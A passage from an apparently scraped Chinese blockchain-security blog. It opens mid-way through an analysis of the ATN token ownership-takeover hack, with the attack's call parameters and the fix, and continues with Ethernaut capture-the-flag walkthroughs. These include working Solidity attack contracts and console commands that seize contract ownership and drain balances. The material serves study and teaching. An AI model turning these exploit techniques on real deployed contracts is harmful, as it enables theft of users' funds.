0x3dd815af5d728903367a3036bc6dbe291de6f0ee 282,069.29 0x6d8750f28fffb8e9920490edb4ed1817a4736998 110,261.2948 利用的合约漏洞： ATN Token合约采用的是在传统ERC20Token合约基础上的扩展版本ERC223，并在其中使用了 dapphub/ds-auth 库。采用这样的设计是为了实现以下几个能力： 天然支持Token互换协议，即ERC20Token与ERC20Token之间的直接互换。本质上是发送ATN时，通过回调函数执行额外指令，比如发回其他Token。 可扩展的、结构化的权限控制能力。 Token合约可升级，在出现意外状况时可进行治理。 单独使用 ERC223 或者 ds-auth 库时，并没有什么问题，但是两者结合时，黑客利用了回调函数回调了setOwner方法，从而获得高级权限。 ERC223转账代码如下： function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public returns (bool success) { ... ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiving.call.value(0)(byte4(keccak256(_custom_fallback)), _from, amout, data); ... } 当黑客转账时在方法中输入以下参数： transferFrom( hacker_address, atn_contract_address, 0, 0, \"setOwner(address)\") _from: 0x2eca25e9e19b31633db106341a1ba78accba7d0f -- 黑客地址 _to: 0x461733c17b0755ca5649b6db08b3e213fcf22546 -- ATN合约地址 _amount: 0 _data: 0x0 _custom_fallback: setOwner(address) 该交易执行的时候 receiver 会被 _to(ATN合约地址) 赋值， ATN 合约会调用 _custom_fallback 即 DSAuth 中的 setOwner(adddress) 方法，而此时的 msg.sender 变为 ATN 合约地址，owner_参数为_from(黑客地址) ds-auth库中setOwner 代码如下： functuin setOwner(address owner_) public auth { own = owner_; LogSetOwner(owner); } 此时 setOwner 会先验证 auth 合法性的，而 msg.sender 就是ATN的合约地址。setOwner 的 modifier auth 代码如下： modifier auth { require(isAuthorized(msg.sender, msg.sig)); _; } function isAuthorized(address src, bytes4 sig) internal view returns (bool) { if (src == address(this)) { //此处的src与ATN合约地址一致返回true return true; } else { … } 通过利用这个ERC223方法与DS-AUTH库的混合漏洞，黑客将 ATN Token合约的 owner 变更为自己控制的地址。获取 owner 权限后，黑客发起另外一笔交易对 ATN 合约进行攻击，调用 mint 方法给另外一个地址发行 1100wATN。 最后，黑客调用 setOwner 方法将权限复原。 在 ATN 项目中使用到了 ERC223 和 ds-auth 库，两个库在单独使用的情况下没有问题，同时使用时就会出现安全问题，以下是存在安全问题的代码片段： Github/ATN: a. ERC223 标准中的自定义回调函数：Github/ERC223: function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public returns (bool success) { ... if (isContract(_to)) { ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data); } ... } b. ds-auth 权限认证和更新合约拥有者函数：Github/ds-auth: ... function setOwner(address owner_) public auth { owner = owner_; emit LogSetOwner(owner); } ... modifier auth { require(isAuthorized(msg.sender, msg.sig)); _; } function isAuthorized(address src, bytes4 sig) internal view returns (bool) { if (src == address(this)) { return true; } else if (src == owner) { return true; } else if (authority == DSAuthority(0)) { return false; } else { return authority.canCall(src, this, sig); } } 黑客通过调用 transferFrom() 函数，并传入黑客自己的地址作为 _from 参数， ATN 合约的地址作为 _to 参数，并传入 setOwner() 作为回调函数；在执行过程中，由于 call 调用自动忽略多余的参数，黑客的地址将作为 setOwner() 的参数成功执行到函数内部，与此同时，call 调用已经将 msg.sender 转换为了合约本身的地址，也就绕过了 isAuthorized() 的权限认证，黑客成功将合约的拥有者改为了自己；随后调用 Mint() 函数为自己发行代币，最后黑客再次调用 setOwner() 将权限还原，企图销毁作案现场。 漏洞评估：漏洞等级：严重 产品影响：atn-contracts 可能损失：导致Token总供应量发生变化 发现了基于ERC223标准与dapphub/ds-auth库相结合的合约漏洞，更准确的说是在ERC223回调函数发起时，调用本身合约时可能造成内部权限控制失效。 应对措施：经过上面的追踪，发现黑客将黑币分散在14个不同的新地址中，而这些地址中并没有ETH，暂时不存在立即的转账到交易所销赃的风险。我方有能力立即冻结黑客的黑币，恢复供应量的变化，所以，重点在如何追踪到黑客，应对思路如下： 准备修复措施，增加Guard合约禁止回调函数向ATN合约本身回调；增加黑名单合约，随时冻结黑客地址 等待黑客向交易所发送充值交易，以便获得进一步证据 获得证据后，立即启动修复流程，将黑客相关地址加入黑名单，禁止其转移ATN Token 基金会销毁等量ATN Token以恢复供给总量，并在ATN主链上线时予以修正。 产品修复：新增Guard合约，禁止对ATN合约发送转账交易，进而防止回调函数对ATN合约进行方法调用。 由于 ATN 合约的灵活性和治理扩展性，创建并添加了两个 Guard 合约。 创建添加 FrozenGuard 合约，禁止对 ATN 合约发送转账交易。 创建添加 StopTransferGuard 合约，冻结黑客账户地址，禁止其 ATN进行转账。 基金会销毁 1100w ATN，恢复 ATN 总量。 ATN Gurad 会在发生转账交易时，对交易的合法性进行处理。 ATN 转账代码如下： function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public returns (bool success) { if (isContract(controller)) { if (!TokenController(controller).onTransfer(_from, _to, _amount)) throw; } ... } ATN 的 TokenController 接管了 onTranser(_from, _to, amount) 处理方法，实现对交易的合法性验证。具体方法在 SwapController 中实现： function onTransfer(address _from,address _to, uint _amount) public returns (bool) { for (uint i =0; i&lt;guards.length; i++) { if (!gruards[i].onTokenTransfer(_from, _to, amount)) { return false; } } } SwapController 中维护了 TokenTransferGuard 的合约列表，可以添加多个 Guard 合约对交易的合法性进行验证。 FrozenGuard.sol 代码如下： function onTokenTransfer(address _from, addres _to, uint _amount) public returns (bool) { if (_to == tokenAddress) { return false; } return true; } tokenAddress为 ATN 合约地址，禁止对 ATN 地址发送转账交易。 StopTransferGurad.sol 代码如下： function onTokenTransfer(address _from, addres _to, uint _amount) public returns (bool) { if (!stopped &amp;&amp; isBlack[_from]) { return false; } return true; } isBlack 存储所有黑客非法发行 ATN 的账户地址，支持动态更新。所有转账到这些的 ATN 也将无法转账。 stopped 该Guard的开关。 安全审计结果： 模拟冻结黑名单地址转账结果：https://kovan.etherscan.io/tx/0x68755305fee0d995f4ee79f6ab9d14e1aaf5d4b1c2d5838acbbaff464b6579d5 模拟向ATN合约转账结果：https://kovan.etherscan.io/tx/0x78738ab30a507ac209fb4aaf80be7e92c558bff8767887d3e1f4e0a445f16444 模拟黑客攻击结果：https://kovan.etherscan.io/tx/0x7c72613fca4440b7775d08fde6beeba0e428a975cdf58a912ee76cb0e1ea87af 转账都失败，判定漏洞已修复。 最终，黑客向交易所进行充值，获得证据 https://etherscan.io/tx/0x18bd80b810f6a6b6d397901d677657d39f8471069bcb7cfbf490c1946dfd617d Guard安全修复合约即刻部署，黑客相关地址予以禁止转账处理。 ATN将在交易所配合的情况下向黑客进行追踪，并保留向执法机构报案的权利。基金会销毁 1100w ATN，恢复 ATN 总量，并将在主链上线时对黑客地址内的资产予以剔除。 由于 ATN 合约设计增加多项功能及治理机制，增加了审计的难度和复杂度，在发布到链上之前进行的几次内部和外部审计均未发现该漏洞。 攻击发生后，ATN技术团队及时察觉极速反应并部署了ATN Token合约的防御措施并迅速修复了此未知漏洞；在实时监测到黑客将资金转入交易所地址基本可断定为黑客攻击（而非白帽行为）后，跟相关交易所协商追踪黑客信息并保留追责权利。 合约的安全审计，仅依靠开发者的经验和能力总有隐患，过去业内的几次合约漏洞事件也说明了这个问题。将来我们需要有更多的类似形式化验证的工具来帮助开发者发现潜在问题，从而编写更加健壮的合约。 对其他以太坊Token合约的预警:所有同时用到类似ERC223推荐实现的custom_fallback和ds-auth的合约，或者说内置有其他权限控制得合约，很可能也存在这个漏洞，需要检查确认。 ERC223的这个custom_fallback 的call处理，可以让public获取Token合约的this作为msg.sender调用其他方法(虽然参数限定，但是也可以通过编码的方式hack)，另外ds-auth默认是this可以获得授权，这边有一些争议，是否ds-auth默认授权范围太大。 2.大量代币使用不安全代码 对于第二种利用模型，在目前公开的智能合约中，仍有不少合约使用这种不安全的代码，为了实现通知接收方以完成后续的操作，加入了一个高度自由的回调函数方法。以下是存在安全隐患的代码片段： (etherscan: https://etherscan.io/address/0xbe803e33c0bbd4b672b97158ce21f80c0b6f3aa6#code) ... function transfer(address _to, uint256 _value) public returns (bool success) { require(_to != address(0)); require(_value &lt;= balances[msg.sender]); require(balances[_to] + _value &gt; balances[_to]); balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } ... function approveAndCallcode(address _spender, uint256 _value, bytes _extraData) public returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); if(!_spender.call(_extraData)) { revert(); } return true; } ... 黑客通过调用 approveAndCallcode() 函数，将合约地址作为 _spender 参数，并将 transfer() 的调用转换为字节序列作为 _extraData 参数，最终调用 transfer() 函数。在 transfer() 函数中，_to 参数为黑客的地址，而此时 msg.sender 的值已经是合约本身的地址了，黑客通过这种方式，成功窃取了合约地址中的代币。 黑客攻击链： 对于上述所描述的安全问题目前还不能造成直接的经济损失。在对这类智能合约的审计过程中，发现目前大量的代币合约不会使用到合约本身的地址作为存储单元，也就是说 合约地址所对应的代币量为 0 (balances[address(this)] == 0)。但这种不安全的代码很难猜测到在后续的发展中，会引起什么样的问题，应该保持关注并避免这种不安全的代码。 callcode 安全问题 callcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。 由于 callcode 同时包含了 call 和 delegatecall 的特性，通过上文对 call 和 delegatecall 的安全问题进行了分析和举例，可以得出的结论是 call 和 delegatecall 存在的安全问题将同时存在于 callcode 中，这里不再进行详细的分析。 总结目前，区块链技术极高的热度促使该技术不断的投入到了生产环境中，但还没有完整的技术流水线，也没有统一的行业规范，同时 Solidity 语言现在版本为 0.4.25，还没有发布第一个正式版本，导致基于区块链技术的产品出现各种安全漏洞，部分漏洞可以直接造成经济损失。 针对文中所提到的安全隐患，这里给开发者几个建议： call、callcode、delegatecall调用的自由度极大，并且 call 会发生 msg 值的改变，需要谨慎的使用这些底层的函数；同时在使用时，需要对调用的合约地址、可调用的函数做严格的限制。 call 与 callcode 调用会改变 msg 的值，会修改 msg.sender 为调用者合约的地址，所以在合约中不能轻易将合约本身的地址作为可信地址。 delegatecall 与 callcode 会拷贝目标代码到自己的环境中执行，所以调用的函数应该做严格的限制，避开调用任意函数的隐患。 智能合约在部署前必须通过严格的审计和测试。","categories":[{"name":"以太坊","slug":"以太坊","permalink":"https://kdlwtrdrgm.github.io/categories/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"跨链与侧链","slug":"区块链/Ethernaut-波卡和COMCOS","date":"2021-07-27T16:01:00.000Z","updated":"2021-08-02T12:50:35.575Z","comments":true,"path":"/区块链/区块链/Ethernaut-波卡和COMCOS/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/Ethernaut-%E6%B3%A2%E5%8D%A1%E5%92%8CCOMCOS/","excerpt":"","text":"跨链与侧链跨链简单的说跨链就是解决如何把一个条链上的Token转移到另外一条链上。本质上是一套链与链之间的清算机制，清算的本质就是精准记账。 为什么要跨链? 1、不同链上的资产交换 2、多个场景打通的token互兑 3、跨越多个区块链网络达成的智能合约 4、一条链上资产被抵押或者锁定，能否用于抵押另一条链上的商品与服务，这需要实现链之间的通信与确认 如何实现跨链 1、分布式私钥控制 2、用侧链&amp;中继链 3、公证人模式 4、哈希锁定模式","categories":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"闪电贷攻防和智能合约审计","slug":"区块链/闪电贷攻防与智能合约审计","date":"2021-07-27T16:00:00.000Z","updated":"2021-08-02T12:50:22.872Z","comments":true,"path":"/区块链/区块链/闪电贷攻防与智能合约审计/","link":"","permalink":"https://kdlwtrdrgm.github.io/%E5%8C%BA%E5%9D%97%E9%93%BE/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%97%AA%E7%94%B5%E8%B4%B7%E6%94%BB%E9%98%B2%E4%B8%8E%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/","excerpt":"","text":"闪电贷攻防和智能合约审计什么是闪电贷 本身是一个很好的金融创新，必须在智能合约中操作，原子性，最小单位执行，不成功就失败，要么成功要么失败 闪电贷和闪电兑 闪电贷AAVE项目 闪电兑函数UniswapV2项目 乐观转账 区别在于data参数有没有变化 闪电贷攻击事件分析闪电贷攻击防范建议智能合约审计","categories":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"Hello Ethernaut第0关练习","slug":"Ethernaut/0.Ethernaut-Hello Ethernaut","date":"2021-07-27T09:17:00.000Z","updated":"2021-08-02T08:27:30.394Z","comments":true,"path":"/Ethernaut/Ethernaut/0.Ethernaut-Hello Ethernaut/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/0.Ethernaut-Hello%20Ethernaut/","excerpt":"","text":"Hello Ethernaut第0关练习要求：熟悉关卡，另有一个熟悉代码的教程：CryptoZombies 合约代码：无 游戏基础教学：题目上有详细步骤， 通过谷歌浏览器下载meta mask插件，按照他的步骤设置meta mask钱包，记住当时的助记码，使用rinbeby网络 通过水龙头获取一些测试币，ethernaut游戏是rinkeby网络这个 faucet。获取的流程是通过推特发送一个条含有你钱包的地址的推特然后将推特的链接复制下来粘贴到水龙头网站上，（完成整个游戏大概只需要10eth，因为是测试币，多了没用）如图： 3、然后按F12打开开发者工具中的控制台，输入player,回车 4、这些功能都可以看一下做一下： player//玩家地址 getBalance(player)//玩家余额 help()//帮助文档 instance或contract.address()//合约地址 await ethernaut.owner//部署合约的所有者，我们常用await让代码更简洁直观，下图有对比 await contract.abi//查看他的应用二进制接口有哪些 5、见面关是有题目的 我们按照步骤走 6、付gas费，有时候可能会因为网络问题导致比较慢，耐心点等， 7、这样就算是完成交易了，浏览器会有弹窗，confirmed就代表交易成功， 8、点击提交实例，再付一次gas费，就可以看到，这一关就结束了，下一关","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Fall Out第1关练习","slug":"Ethernaut/1.Ethernaut-Fallback","date":"2021-07-26T10:55:00.000Z","updated":"2021-08-03T02:24:25.990Z","comments":true,"path":"/Ethernaut/Ethernaut/1.Ethernaut-Fallback/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/1.Ethernaut-Fallback/","excerpt":"","text":"Fall back第1关练习要求：仔细查看下面的合约代码。 你会打败这个级别，如果 您声称拥有合同的所有权 您将其余额减少到 0 可能有帮助的事情 与 ABI 交互时如何发送以太币 如何在 ABI 之外发送以太币 wei/ether 单位之间的相互转换 - 参见 help() 命令 - 回退方法 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Fallback { //Fallback合约继承自Ownable合约 using SafeMath for uint256; mapping(address =&gt; uint) public contributions; //通过映射,可以使用地址获取贡献的值 address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); }//构造函数设置合约创建者的贡献值为1000以太币 modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function contribute() public payable { require(msg.value &lt; 0.001 ether);//每次贡献的值小于0.001以太币 contributions[msg.sender] += msg.value;//累计起来 if(contributions[msg.sender] &gt; contributions[owner]) { owner = msg.sender; }//当你贡献的值大于1000的时候就你成为合约所有者 } function getContribution() public view returns (uint) { return contributions[msg.sender]; }//获取你的贡献值 function withdraw() public onlyOwner { owner.transfer(address(this).balance); }//onlyOwner修饰,所以只有合约所有者才能用来提款 fallback() external payable { require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零 owner = msg.sender;//msg.sender就是调用者,也就是我们 //执行这一条语句owner就成了我们 } } 合约分析：合约构造函数 Fallback() 中初始化拥有者贡献度为 1000 ether。我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。但在 contribute() 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。 那应该怎么办呢？这里是重入攻击的关键，同时也是The DAO事件里黑客所用到的攻击。 思路：首先贡献一点金额，来通过 require 触发 fallback 函数，来成为合约的所有者，然后 withdraw 函数转走合约中的所有钱 可以参考官网对fallback的描述 fallback 函数被调用的情况有两种 调用合约中不存在的函数 当合约收到以太币（没有任何数据） 此外，为了接收以太币，fallback 函数必须标记为 payable。 也就是说想要满足题目要求，先成为owner，这里能够做到 fallback() external payable { require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);//判断金额与贡献值是否大于零 owner = msg.sender;//msg.sender就是调用者,也就是我们 //执行这一条语句owner就成了我们 } 其实成为 owner 还有另一种方式，我们仔细看合约的 fallback 函数，即最下方的无名函数。当合约账户收到一笔转账时会自动调用 fallback 函数。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。要满足contributions[msg.sender]&gt;0首先需要通过contribute函数给到contributions[msg.sender]1wei,这里可以了解一下help()相关的信息 可以了解下wei和ether， 第二个要求，通过withdraw函数将来实现 function withdraw() public onlyOwner { owner.transfer(address(this).balance); }//onlyOwner修饰,所以只有合约所有者才能用来提款 接下来进入实例吧 攻击流程：1、点击获取新实例，meta mask提交gas以后在控制台，查看以下信息，玩家地址，合约地址，实例余额，合约拥有者，（注意：每支付完一笔gas费都要稍等片刻，等待交易） 2、要满足题目要求contributions[msg.sender]&gt;0我们使用 contract.contribute({value: 1}) 3、上面就完成了第一步，接着我们触发fallback函数，触发 fallback 函数的条件： 当调用一个不存在的函数的时候 发送没有数据的纯 ether 时 contract.sendTransaction({value: 1}) 楼上说了当合约账户收到一笔转账时会自动调用 fallback 函数， 这时候合约收到了2wei，合约余额是2wei，触发了fallback函数，owner变成了我们自己，就是msg.sender。 4、第二个要求，使用了withdraw使用了transfer()函数实现 contract.withdraw() 这时候目标完成，快乐提交","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Fall Back第2关练习","slug":"Ethernaut/2.Ethernaut-Fall out","date":"2021-07-26T08:31:00.000Z","updated":"2021-08-03T02:28:15.029Z","comments":true,"path":"/Ethernaut/Ethernaut/2.Ethernaut-Fall out/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/2.Ethernaut-Fall%20out/","excerpt":"","text":"Fall out第2关练习要求： 您声称拥有合同的所有权 Rubixi 的故事是以太坊生态系统中一个非常有名的案例。该公司将其名称从“动态金字塔”更改为“Rubixi”，但不知何故他们没有重命名其合约的构造函数方法： contract Rubixi { address private owner; function DynamicPyramid() { owner = msg.sender; } function collectAllFees() { owner.transfer(this.balance) } ... 这允许攻击者调用旧的构造函数并声明合约的所有权，并窃取一些资金。是的。智能合约领域可能会犯大错误。 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import '@openzeppelin/contracts/math/SafeMath.sol'; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable {//这个public的函数并不是构造函数(l与1)...直接调用就可以了 owner = msg.sender;//这条语句就能让我们成为合约所有者 allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, \"caller is not the owner\" ); _; } function allocate() public payable { allocations[msg.sender] = allocations[msg.sender].add(msg.value); } function sendAllocation(address payable allocator) public { require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); } function collectAllocations() public onlyOwner { msg.sender.transfer(address(this).balance); } function allocatorBalance(address allocator) public view returns (uint) { return allocations[allocator]; } } 合约分析： 我们可以发现一个很明显的问题，理论上应该写成 Fallout 的构造函数被写成了 Fal1out ，那么该函数就不是构造函数，意味着该函数可以被我们调用（我们无法调用构造函数）。 并且可以看见owner = msg.sender，直接达到我们的目的，所以直接调用查看owner即可 await contract.Fal1out()//调用Fal1out()函数 await contract.owner()//查看当前合约拥有者 攻击流程：1、获取新实例 2、查看玩家地址，合约地址，查看一下合约拥有者 3、调用Fal1out()函数，付gas费，查看当前合约拥有者已变成我们玩家自己 4、快乐提交去吧","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Coin Flip第3关练习","slug":"Ethernaut/3.Ethernaut-Coin Filp","date":"2021-07-26T05:40:00.000Z","updated":"2021-08-03T03:05:03.256Z","comments":true,"path":"/Ethernaut/Ethernaut/3.Ethernaut-Coin Filp/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/3.Ethernaut-Coin%20Filp/","excerpt":"","text":"Coin Flip第3关练习要求： 这是一个掷硬币游戏，你需要通过猜测掷硬币的结果来建立你的连胜记录。要完成这一关，你需要使用你的心理能力连续10次猜测正确的结果。 合约代码：pragma solidity ^0.4.18; import 'openzeppelin-solidity/contracts/math/SafeMath.sol'; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins;//连胜次数 uint256 lastHash;//上一个hash uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; //这个数是2^255 function CoinFlip() public { consecutiveWins = 0; }//构造函数，每次开始把赢的次数归零 function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(block.blockhash(block.number.sub(1))); //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了 if (lastHash == blockValue) { revert();//如果最后的hash等于计算出来的 }//中止执行并将所做的更改还原为执行前状态 lastHash = blockValue;//改成上个区块的hash值为这个区块的 uint256 coinFlip = blockValue.div(FACTOR); //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1 //因为除法运算会取整,所以coinFlip由blockValue的最高位决定 bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一 return true; } else { consecutiveWins = 0;//否则归零 return false; } } } 合约分析：我们先通读一下全文。首先定义了一个CoinFlip这个合约，然后引用了SafeMath这个库，定义了变量。在后面定义了结构consecutiveWins = 0。然后我们看看函数flip写了什么，首先输入一个布尔的值。那么参数_guess可控。uint256 blockValue = uint256(blockhash(block.number.sub(1)))。block.number表示当前区块数，然后减一。就是上一块。blockhash表示区块的hash，然后转换成uint256.然后判断lastHash == blockValue是否相等，如果等于了就回滚。 这里的意思就是不能重复上次的区块。然后获取到blockValue又赋值给lastHash，就相当于你要连续猜对10次才能通关。uint256 coinFlip = blockValue.div(FACTOR);这里把值赋给coinFlip，bool side = coinFlip == 1 ? true : false;这里的意思是判断coinfilp是否为1，如果不为1返回ture或者false给side。然后在到后面的if中，如果我们输入的值，等于就consecutiveWins++;直到consecutiveWins&gt;10.否则失败。这里我们构造一个攻击合约，类似中间人，因为答案可以预测嘛，我们可以把得到的答案发送给原合约。 exp 如下，把 exp 代码复制到 remix IDE 中，部署 exploit 合约（要用之前得到的那个合约地址） pragma solidity ^0.4.18; import './SafeMath.sol'; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins;//连胜次数 uint256 lastHash;//上一个hash uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; //这个数是2^255 function CoinFlip() public { consecutiveWins = 0; }//构造函数，每次开始把赢的次数归零 function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(block.blockhash(block.number.sub(1))); //blockValue等于前一个区块的hash值转换成uint256,block.number是当前区块数,减一就是上一个了 if (lastHash == blockValue) { revert();//如果最后的hash等于计算出来的 }//中止执行并将所做的更改还原为执行前状态 lastHash = blockValue;//改成上个区块的hash值为这个区块的 uint256 coinFlip = blockValue.div(FACTOR); //coinFlip等于blockValue除以FACTOR,而FACTOR换成256的二进制就是最左位是0，右边全是1 //因为除法运算会取整,所以coinFlip由blockValue的最高位决定 bool side = coinFlip == 1 ? true : false; if (side == _guess) { consecutiveWins++;//如果我们猜的跟他算出来的一样的话连胜次数加一 return true; } else { consecutiveWins = 0;//否则归零 return false; } } } contract attack{ uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; CoinFlip expFlip = CoinFlip(0x199fc78CC3057E5199184E8099C92E481d119f7a); //这表示已经有一个CoinFlip合约部署在了这个地址 function pwn() public{ uint256 blockValue = uint256(block.blockhash(block.number-1)); uint256 coinFlip = blockValue /FACTOR; bool side = coinFlip == 1 ? true : false; expFlip.flip(side); } } 常用的SafeMath.sol也可以贴一下 //SafeMath.sol pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b &lt;= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c &gt;= a); return c; } } 攻击流程：1、点击“Get new Instance”来获取一个实例。然后拿到合约的地址以及 consecutiveWins 的值 2、在 http://remix.ethereum.org 部署我们的合约，先新建一个workspaces自己命名然后再其contracts目录下（也可以自己新建文件夹）新建两个sol文件并命名，将上面代码复制过去 将solidity版本修改成为一样的0.4.18版本 compile绿色黄色说明是小问题，红色需要找到报错的代码进行对应的修改，进行deploy，注意图中的Injected Web3，对应的CONTRACT,再点击Deploy,付gas费，稍等片刻成功以后会看到下面出现一个pwn函数 3、点击pwn，付gas费，不要急，慢慢等成功 可以再console中检查一下是否成功，有1次了，说明成功了，我们执行到10次，记住不要急，一个一个慢慢来 4、钱包里面可以看到状态 我们这里是失败了一次，没关系我们继续pwn，gaslimit也可以自己调整一个合适的值，要比钱包活动中pwn的数量大一些， 有时候默认的燃料不够会导致失败，我们就设置成50000就没问题 5、直到数值变成10，我们就可以提交实例了","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"},{"title":"Telephone第4关练习","slug":"Ethernaut/4.Ethernaut-Telephone","date":"2021-07-24T03:33:00.000Z","updated":"2021-08-03T03:11:45.137Z","comments":true,"path":"/Ethernaut/Ethernaut/4.Ethernaut-Telephone/","link":"","permalink":"https://kdlwtrdrgm.github.io/Ethernaut/Ethernaut/4.Ethernaut-Telephone/","excerpt":"","text":"Telephone第4关练习要求： 获取合约的权限 合约代码：// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; }//构造函数,部署的人是合约的所有者 function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; }//最初调用合约的人与调用者不一样的话,就把合约的所有者改成_owner } } 合约分析：观察合约，我们的目的是要获取合约的权限，所以观察合约中是否有owner = msg.sender。发现一处是在构造函数中，把owner赋值给合约的创建者，检查构造函数没有问题。接下来我们查看changeOwner函数中的if (tx.origin != msg.sender) ,其中tx.origin表示最初交易发起人，msg.sender表示消息的发起人,举个栗子： 假设这样一条调用链：A -&gt; B -&gt; C -&gt; D，其中D 的 msg.sender 是 C，其 tx.origin 为 A。 如果在同一个合约中使用的话，他们tx.origin=msg.sender，如果在多合约的情况下，比如用户A通过合约来调用B合约，那么对于B合约来说，msg.sender就是合约A，tx.origin是用户，实际使用中，应该避免使用tx.origin(1,之后可能被废弃2，容易引发安全问题) 所以只要tx.origin不等于msg.sender，我们就可以调用changeOwner替换掉owner，所以构造这样一个合约： pragma solidity ^0.5.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; }//最初调用合约的人与调用者不一样的话,就把合约的所有者改成_owner } } contract exp{ Telephone a = Telephone(输入你的实例地址); function hack() public{ a.changeOwner(msg.sender); } } 攻击流程：1、点击“Get new Instance”来获取一个实例。 2、输入contract.address来获取合约地址，用输出的合约地址替换以下合约中的地址在remix中编译合约： pragma solidity ^0.5.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } contract exp{ Telephone a = Telephone(0x66be5c7AD850F3742A727fA0Ac35258831b437B5); function hack() public{ a.changeOwner(msg.sender); } } 3、点击hack稍等片刻，查看原合约中的owner的地址： 